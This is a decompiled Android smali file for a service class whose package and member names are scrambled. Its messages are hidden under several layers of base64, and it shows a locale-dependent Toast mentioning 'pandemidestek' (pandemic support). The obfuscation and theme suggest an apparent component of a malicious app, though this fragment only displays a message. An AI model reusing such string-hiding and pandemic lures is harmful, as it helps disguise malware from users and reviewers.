.class public Lnaqsl/ebxcb/exu/ServiceToast;
.super Landroid/app/Service;
.source ""


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/int;

.field for:Lnaqsl/ebxcb/exu/ifdf;

.field ifdf:Lnaqsl/ebxcb/exu/int;


# direct methods
.method public constructor <init>()V
    .registers 2

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceToast;->fddo:Lnaqsl/ebxcb/exu/int;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceToast;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v0, Lnaqsl/ebxcb/exu/ifdf;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/ifdf;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceToast;->for:Lnaqsl/ebxcb/exu/ifdf;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3

    new-instance p1, Ljava/lang/UnsupportedOperationException;

    const-string v0, "Vmtjd05VMUZiRWxpUjNoclVUQktkMWxzYUVOak1YQllUVmQ0YVdKc1NuTlhhMFU1VUZFOVBRPT0="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {p1, v0}, Ljava/lang/UnsupportedOperationException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 9

    :try_start_0
    sget-object p1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v0, 0xc8

    invoke-virtual {p1, v0, v1}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_7
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_7} :catch_8
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_7} :catch_fb

    goto :goto_c

    :catch_8
    move-exception p1

    :try_start_9
    invoke-virtual {p1}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_c
    iget-object p1, p0, Lnaqsl/ebxcb/exu/ServiceToast;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {p1, p0}, Lnaqsl/ebxcb/exu/int;->char(Landroid/content/Context;)Ljava/lang/String;

    iget-object p1, p0, Lnaqsl/ebxcb/exu/ServiceToast;->for:Lnaqsl/ebxcb/exu/ifdf;

    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    iget-object p1, p0, Lnaqsl/ebxcb/exu/ServiceToast;->for:Lnaqsl/ebxcb/exu/ifdf;

    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string p1, "pandemidestek"

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object p3

    invoke-virtual {p3}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p3

    const-string v0, "V2tWb1NsQlJQVDA9"

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p3, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result p3
    :try_end_3f
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_3f} :catch_fb

    const/4 v0, -0x1

    const/16 v1, 0x10

    const/4 v2, 0x1

    const-string v3, "VmxST1UyVlhSbGhPVnpWU1ZqQTFjVmRzYUU5bGJVWllVMjVDYVZJeWQzZGFWa1U1VUZFOVBRPT0="

    const/4 v4, 0x0

    if-eq p3, v0, :cond_a2

    :try_start_48
    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "Vm14b2MySnRVbGhsUjJocFZqQmFNV1ZGZUVka1ZXeE9WREkxV2xZemNFWmpNazVZV214c1dGTnVRbWxTZWtaeldYcEtjbG95Um1wVU1qVm9WbnBTYmxaVVNsZGxWMUowWWtod2FWSXhXalZYYTJSWFpGVnNSRmw2TUQwPQ=="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "VTI1c1FsQlJQVDA9"

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object p1, p0, Lnaqsl/ebxcb/exu/ServiceToast;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p0, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1, v1, v4, v4}, Landroid/widget/Toast;->setGravity(III)V

    :goto_9e
    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    goto :goto_fb

    :cond_a2
    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceToast;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, p0, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "VTFWT2FsQlJQVDA9"

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "VTI1ak9WQlJQVDA9"

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    const/16 p3, -0x64

    invoke-virtual {p1, v1, v4, p3}, Landroid/widget/Toast;->setGravity(III)V
    :try_end_fa
    .catch Ljava/lang/Exception; {:try_start_48 .. :try_end_fa} :catch_fb

    goto :goto_9e

    :catch_fb
    :goto_fb
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    return p2
.end method
